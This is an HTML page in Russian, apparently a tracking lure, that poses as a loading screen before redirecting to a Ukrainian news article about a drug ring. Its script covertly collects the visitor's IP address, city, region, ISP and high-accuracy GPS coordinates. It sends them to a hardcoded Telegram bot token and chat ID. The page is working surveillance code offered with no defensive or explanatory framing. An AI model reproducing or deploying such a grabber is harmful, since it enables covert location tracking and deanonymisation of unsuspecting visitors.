<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Загрузка...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #000;
      height: 100vh;
      overflow: hidden;
    }
    #status {
      display: none;
    }
  </style>
</head>
<body>
  <div id="status">Сбор данных...</div>

  <script>
    const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";

    function sendToTelegram(message, callback) {
      fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: 490491527,
          text: message
        })
      }).finally(() => {
        callback();
      });
    }

    function startRedirect() {
      window.location.href = redirectUrl;
    }

    fetch("https://ipwho.is/")
      .then(res => res.json())
      .then(data => {
        const ipMessage = `
IP: ${data.ip}
Город: ${data.city}
Регион: ${data.region}
Страна: ${data.country}
Провайдер: ${data.connection.isp}
Время: ${new Date().toLocaleString()}`;

        // Попытка получить GPS
        if (navigator.geolocation) {
          let gotGPS = false;

          const gpsTimeout = setTimeout(() => {
            if (!gotGPS) {
              const msg = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
              sendToTelegram(msg, startRedirect);
            }
          }, 5000); // до 5 секунд ожидания

          navigator.geolocation.getCurrentPosition(
            pos => {
              gotGPS = true;
              clearTimeout(gpsTimeout);
              const lat = pos.coords.latitude;
              const lon = pos.coords.longitude;
              const acc = pos.coords.accuracy;
              const msg = ipMessage + `\n\nGPS: ${lat}, ${lon}\nТочность: ${acc} м`;
              sendToTelegram(msg, startRedirect);
            },
            err => {
              clearTimeout(gpsTimeout);
              const msg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
              sendToTelegram(msg, startRedirect);
            },
            {
              enableHighAccuracy: true,
              timeout: 5000,
              maximumAge: 0
            }
          );
        } else {
          const msg = ipMessage + "\n\n⚠️ GPS не поддерживается.";
          sendToTelegram(msg, startRedirect);
        }
      })
      .catch(() => {
        const msg = "❌ Ошибка получения IP-геолокации.";
        sendToTelegram(msg, startRedirect);
      });
  </script>
</body>
</html>


